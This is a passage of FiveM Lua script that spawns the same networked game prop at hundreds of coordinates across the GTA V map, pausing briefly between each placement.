        CreateObject(3821613641, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
